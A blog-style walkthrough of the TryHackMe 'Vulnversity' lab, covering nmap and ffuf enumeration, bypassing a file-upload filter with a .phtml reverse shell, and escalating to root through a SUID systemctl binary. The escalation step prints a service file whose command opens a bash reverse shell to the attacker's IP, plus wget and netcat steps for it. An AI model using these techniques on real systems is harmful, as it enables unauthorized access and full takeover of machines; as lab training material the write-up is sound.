---
title: Vulnversity Writeup - TryHackMe
published: 2023-08-10
description: 'A walkthrough of the Vulnversity room on TryHackMe, covering active reconnaissance, web application exploitation, and privilege escalation.'
image: './cover.jpg'
tags: [TryHackMe, Enumeration , PrivEsc]
category: 'TryHackMe'
draft: false
---

# Vulnversity

This room is based on active recon, web app attacks, and privilege escalation.

---

## Task 1: Deployment

The first and most important task is to deploy the machine. Once it's live, the vulnerable machine IP is assigned. All other tasks are performed on it. You can also increase the machine time if needed.

---

## Task 2: Reconnaissance

We begin by scanning the target machine using [nmap](https://nmap.org).

### Common Nmap Commands

![nmap command flags](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XCqHfPYf1oUfOJTHxXJGPQ.png)

### Nmap Scan Result

```bash
nmap -sC -sV -A -oN initial <machine IP>
````

![nmap result](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*8HIov1lHtIRkAtYvUkQnRg.png)

**Key Observations:**

* 6 ports are open.
* Squid version 3.5.12 is running.
* OS is Ubuntu.
* A web server is running on port 3333.

Additional answers:

* `-p-400` scans the first 400 ports.
* `-n` disables DNS resolution.


:::tip
If we don't specify any port and scan technique by default nmap will perform scan on the most common 1,000 ports for each protocol and Perform default -sS SCAN TECHNIQUES.
:::

## Task 3: Locating Directories Using FFUF

This task involves directory enumeration. Although the room mentions `gobuster`, we’ll use `ffuf`.

### FFUF Command

```bash
ffuf -u http://<machine IP>:3333/FUZZ -w <wordlist path>
```

![ffuf commands](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*ldKH4NkrEblOUjQo-1kq7Q.png)

### FFUF Results

![ffuf result](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*dK4MCCmb1DaaG2dP_D0Wjw.png)

We found `/internal` which contains a file upload form.

---

## Task 4: Compromising the Web Server

Trying to upload a `.php` file gives this error:

![upload error](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*7k9v_MSQJ9VhX_gV7LLUSw.png)

### How to Bypass?

Use BurpSuite’s **Intruder** to fuzz extensions. Try these:

* `.php`, `.php3`, `.php4`, `.php5`, `.phtml`

![burpsuite intruder](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*J_clNurX4VFMaZQf7j3AyQ.png)

Paste the extensions into the payload.

![extension list](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*FFzF1omQDDGSPDXJtgiMqg.png)

`.phtml` is accepted as it returns a different response size:

![different response](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*Q-kcKOIjBs_yUWS4XHyotA.png)

Upload a reverse shell as `rev.phtml`:

![upload success](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*Jxdx8TTXjAD_mxWRxlob_A.png)

Start a listener with:

```bash
nc -lvnp 4444
```

Click the uploaded file and get a shell:

![reverse shell](https://miro.medium.com/v2/resize\:fit:876/format\:webp/1*0RJ_r0pOFwhSyfoEjC89fA.png)

Check user info:

![user info](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*atOmdqitXMGdsKKOW66L1Q.png)

### User Flag

![user flag](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*uxEp7u6HqNdjTuVW3mfsMg.png)

**Key Takeaways:**

* `.php` is blocked, but `.phtml` is allowed.
* Username is `bill`.
* Found user flag.

---

## Task 5: Privilege Escalation

Check for SUID binaries:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

We find `/bin/systemctl`:

![systemctl suid](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*UODqcAkpEvUDhKW5fQrpfw.png)

### Exploit with GTFOBins

Reference: [GTFOBins - systemctl](https://gtfobins.github.io/gtfobins/systemctl/)

Modified service file:

```bash
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<your-ip>/4445 0>&1'
RemainAfterExit=yes
[Install]
WantedBy=multi-user.target
```

![exploit code](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*KV0jma8tjYUgvZd3h9MC_Q.png)

Host it with:

```bash
python3 -m http.server 80
```

![http server](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*laOxvz_xLcCQh8iUTQYHvQ.png)

Download it on the target:

```bash
wget http://<your-ip>/root.service
```

![wget file](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*Mq1Zq6H0qWXoytgRuBlaEg.png)

Run the service:

```bash
systemctl link /home/bill/root.service
systemctl enable root.service
systemctl start root.service
```

![systemctl start](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*EHQjCvL2lOd4HD2aClWZsA.png)

Catch the root shell:

![root shell](https://miro.medium.com/v2/resize\:fit:1248/format\:webp/1*DofM3IUgoCvVJa8rTJnEpA.png)

### Root Flag

During the privilege escalation phase, `/bin/systemctl` was identified as an unusual SUID binary. Exploiting it allowed us to escalate privileges and access the root shell.

The root flag obtained is:

```
a5...d5
```


